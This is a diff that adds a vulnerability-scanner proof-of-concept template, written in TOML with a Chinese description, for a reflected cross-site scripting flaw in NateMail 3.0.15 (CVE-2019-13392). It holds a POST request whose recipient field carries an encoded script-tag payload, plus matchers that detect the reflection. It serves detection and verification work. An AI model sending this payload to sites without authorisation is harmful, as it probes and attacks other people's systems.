@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "通过向目标站点的 NateMail.php 发送包含恶意 JavaScript 的 recipient 参数的 POST 请求，验证目标是否存在反射型 XSS 漏洞。NateMail 的收件人数组默认以整数作为键值，任何非数字字符串输入均会被视为无效并直接反射回响应页面，导致恶意脚本在浏览器中执行。"
+id = "POC-AVE-2019-0065"
+name = "MindPalette NateMail 3.0.15 反射型跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2019-0065"]
+vuln_id = [
+    "CVE-2019-13392",
+    "AVE-2019-0065",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/NateMail.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["</script><script>alert(document.domain)</script>"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
